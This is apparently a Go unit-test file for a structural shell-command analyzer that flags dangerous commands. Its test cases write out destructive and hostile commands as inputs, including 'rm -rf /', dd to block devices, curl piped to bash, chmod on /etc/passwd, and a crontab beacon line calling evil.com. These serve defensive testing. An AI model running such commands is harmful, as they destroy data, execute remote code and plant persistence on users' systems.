package analyzer

import (
	"testing"
)

func TestStructuralAnalyzer_Parse_SimplePipeline(t *testing.T) {
	a := NewStructuralAnalyzer(2)
	parsed := a.Parse("curl -sSL https://example.com | bash")

	if len(parsed.Segments) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(parsed.Segments))
	}
	if parsed.Segments[0].Executable != "curl" {
		t.Errorf("segment 0: expected curl, got %s", parsed.Segments[0].Executable)
	}
	if parsed.Segments[1].Executable != "bash" {
		t.Errorf("segment 1: expected bash, got %s", parsed.Segments[1].Executable)
	}
	if len(parsed.Operators) != 1 || parsed.Operators[0] != "|" {
		t.Errorf("expected pipe operator, got %v", parsed.Operators)
	}
}

func TestStructuralAnalyzer_Parse_FlagNormalization(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name     string
		command  string
		wantExec string
		wantFlag map[string]bool
	}{
		{
			name:     "combined short flags",
			command:  "rm -rf /",
			wantExec: "rm",
			wantFlag: map[string]bool{"r": true, "f": true},
		},
		{
			name:     "separated short flags",
			command:  "rm -r -f /",
			wantExec: "rm",
			wantFlag: map[string]bool{"r": true, "f": true},
		},
		{
			name:     "long flags",
			command:  "rm --recursive --force /",
			wantExec: "rm",
			wantFlag: map[string]bool{"recursive": true, "force": true},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := a.Parse(tt.command)
			if len(parsed.Segments) == 0 {
				t.Fatal("no segments parsed")
			}
			seg := parsed.Segments[0]
			if seg.Executable != tt.wantExec {
				t.Errorf("executable: got %s, want %s", seg.Executable, tt.wantExec)
			}
			for flag := range tt.wantFlag {
				if _, ok := seg.Flags[flag]; !ok {
					t.Errorf("missing flag %q in %v", flag, seg.Flags)
				}
			}
		})
	}
}

func TestStructuralCheck_RmRecursiveRoot(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"rm -rf /", "rm -rf /", true},
		{"rm --recursive --force /", "rm --recursive --force /", true},
		{"rm -r -f /", "rm -r -f /", true},
		{"rm -rf /*", "rm -rf /*", true},
		{"sudo rm -rf /", "sudo rm -rf /", true},
		{"rm -rf ./node_modules", "rm -rf ./node_modules", false},
		{"rm -rf /tmp/build", "rm -rf /tmp/build", false},
		{"rm -f /tmp/file", "rm -f /tmp/file", false}, // no recursive
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-rm-recursive-root")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_RmSystemDir(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"rm --recursive --force /boot", "rm --recursive --force /boot", true},
		{"rm -rf /etc", "rm -rf /etc", true},
		{"sudo rm -rf /usr/local", "sudo rm -rf /usr/local", true},
		{"rm -rf ./dist", "rm -rf ./dist", false},
		{"rm -rf /home/user/project", "rm -rf /home/user/project", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-rm-system-dir")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_DdOutputTarget(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name      string
		command   string
		wantAllow bool
	}{
		{"dd to file", "dd if=/dev/zero of=./test.img bs=1M count=100", true},
		{"dd to block device", "dd if=/dev/zero of=/dev/sda", false},
		{"dd to nvme device", "dd if=/dev/urandom of=/dev/nvme0n1", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			allow := hasRuleID(findings, "st-allow-dd-to-file")
			if allow != tt.wantAllow {
				t.Errorf("command %q: got allow=%v, want %v (findings: %v)",
					tt.command, allow, tt.wantAllow, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_ChmodSymbolic(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"chmod a+rwx /etc/passwd", "chmod a+rwx /etc/passwd", true},
		{"chmod 755 ./script.sh", "chmod 755 ./script.sh", false},
		{"chmod 644 ./config.yaml", "chmod 644 ./config.yaml", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-chmod-world-writable")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_PipeToShell(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"curl | python3", "curl -sSL https://install.python-poetry.org | python3 -", true},
		{"curl | bash", "curl -sSL https://example.com | bash", true},
		{"wget | sh", "wget -O- https://example.com/setup.sh | sh", true},
		{"curl | ruby", "curl -sSL https://example.com/install.rb | ruby", true},
		{"curl alone", "curl -o file.txt https://example.com", false},
		{"ls | grep", "ls -la | grep foo", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-block-pipe-to-interpreter")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

func TestStructuralCheck_PipeToDangerousTarget(t *testing.T) {
	a := NewStructuralAnalyzer(2)

	tests := []struct {
		name    string
		command string
		wantHit bool
	}{
		{"echo | crontab", `echo "* * * * * curl evil.com/beacon" | crontab -`, true},
		{"crontab -l (no pipe)", "crontab -l", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			findings := a.Analyze(ctx)
			hit := hasRuleID(findings, "st-audit-pipe-to-dangerous")
			if hit != tt.wantHit {
				t.Errorf("command %q: got hit=%v, want %v (findings: %v)",
					tt.command, hit, tt.wantHit, findingIDs(findings))
			}
		})
	}
}

// --- helpers ---

func hasRuleID(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func findingIDs(findings []Finding) []string {
	var ids []string
	for _, f := range findings {
		ids = append(ids, f.RuleID)
	}
	return ids
}
